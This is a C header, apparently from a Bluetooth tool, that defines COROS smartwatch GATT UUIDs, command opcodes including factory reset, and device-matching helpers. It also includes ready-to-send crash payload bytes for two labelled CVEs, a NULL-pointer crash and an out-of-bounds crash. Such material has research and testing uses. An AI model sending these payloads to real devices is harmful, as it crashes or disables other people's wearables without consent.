#pragma once

#include <stdint.h>
#include <stdbool.h>
#include <string.h>

// COROS proprietary GATT UUIDs (little-endian byte order for 128-bit)

// Main command channel ("weloop")
// Service: 6e400001-b5a3-f393-e0a9-77656c6f6f70
#define COROS_SVC_CMD_UUID \
    {0x70, 0x6F, 0x6F, 0x6C, 0x65, 0x77, 0xA9, 0xE0, \
     0x93, 0xF3, 0xA3, 0xB5, 0x01, 0x00, 0x40, 0x6E}
// Write: 6e400002-...77656c6f6f70
#define COROS_CMD_WRITE_UUID \
    {0x70, 0x6F, 0x6F, 0x6C, 0x65, 0x77, 0xA9, 0xE0, \
     0x93, 0xF3, 0xA3, 0xB5, 0x02, 0x00, 0x40, 0x6E}
// Notify: 6e400003-...77656c6f6f70
#define COROS_CMD_NOTIFY_UUID \
    {0x70, 0x6F, 0x6F, 0x6C, 0x65, 0x77, 0xA9, 0xE0, \
     0x93, 0xF3, 0xA3, 0xB5, 0x03, 0x00, 0x40, 0x6E}

// Notification/UI channel
// Service: 6e400001-b5a3-f393-e0a9-77757c7f7f70
#define COROS_SVC_NOTIF_UUID \
    {0x70, 0x7F, 0x7F, 0x7C, 0x75, 0x77, 0xA9, 0xE0, \
     0x93, 0xF3, 0xA3, 0xB5, 0x01, 0x00, 0x40, 0x6E}
// Write: 6e400002-...77757c7f7f70
#define COROS_NOTIF_WRITE_UUID \
    {0x70, 0x7F, 0x7F, 0x7C, 0x75, 0x77, 0xA9, 0xE0, \
     0x93, 0xF3, 0xA3, 0xB5, 0x02, 0x00, 0x40, 0x6E}

// Standard 16-bit service UUIDs
#define COROS_SVC_BATTERY     0x180F
#define COROS_SVC_DEVICE_INFO 0x180A
#define COROS_SVC_HEART_RATE  0x180D

// Standard characteristic UUIDs
#define COROS_CHAR_BATTERY_LEVEL  0x2A19
#define COROS_CHAR_MODEL_NUMBER   0x2A24
#define COROS_CHAR_SERIAL_NUMBER  0x2A25
#define COROS_CHAR_HW_REVISION    0x2A27
#define COROS_CHAR_SW_REVISION    0x2A28
#define COROS_CHAR_HR_MEASUREMENT 0x2A37

// Command opcodes (written to main command channel)
#define COROS_CMD_FACTORY_RESET 0x85
#define COROS_CMD_DND_CONFIG    0x86
#define COROS_CMD_FIND_DEVICE   0xB4
#define COROS_CMD_OOB_TRIGGER   0xB9  // Triggers CVE-2025-48706

// Notification push header (written to notification channel)
#define COROS_NOTIF_HEADER_0    0x79
#define COROS_NOTIF_HEADER_1    0x00
#define COROS_NOTIF_HEADER_2    0xFF

// NULL crash payload (CVE-2025-48705) — 6 bytes on notification channel
static const uint8_t COROS_CRASH_NULL_PTR[] = {0x79, 0x00, 0xFF, 0x00, 0x00, 0x2E};

// OOB crash payload (CVE-2025-48706) — two packets on main channel
static const uint8_t COROS_CRASH_OOB_1[] = {0xB9, 0x00};
static const uint8_t COROS_CRASH_OOB_2[] = {0x00, 0x00};

// Find device (beep) command
static const uint8_t COROS_CMD_BEEP[] = {0xB4, 0x00};

// Check if device name matches COROS pattern
static inline bool coros_is_known_name(const char* name) {
    if(!name || name[0] == '\0') return false;
    const char* prefixes[] = {"COROS", "Decathlon GPS", NULL};
    for(int i = 0; prefixes[i]; i++) {
        size_t plen = strlen(prefixes[i]);
        if(strncmp(name, prefixes[i], plen) == 0) return true;
    }
    return false;
}

// Match 128-bit UUID against known COROS service UUIDs
static inline bool coros_match_cmd_svc(const uint8_t* uuid_128) {
    static const uint8_t expected[] = COROS_SVC_CMD_UUID;
    return memcmp(uuid_128, expected, 16) == 0;
}

static inline bool coros_match_notif_svc(const uint8_t* uuid_128) {
    static const uint8_t expected[] = COROS_SVC_NOTIF_UUID;
    return memcmp(uuid_128, expected, 16) == 0;
}

static inline bool coros_match_cmd_write(const uint8_t* uuid_128) {
    static const uint8_t expected[] = COROS_CMD_WRITE_UUID;
    return memcmp(uuid_128, expected, 16) == 0;
}

static inline bool coros_match_notif_write(const uint8_t* uuid_128) {
    static const uint8_t expected[] = COROS_NOTIF_WRITE_UUID;
    return memcmp(uuid_128, expected, 16) == 0;
}
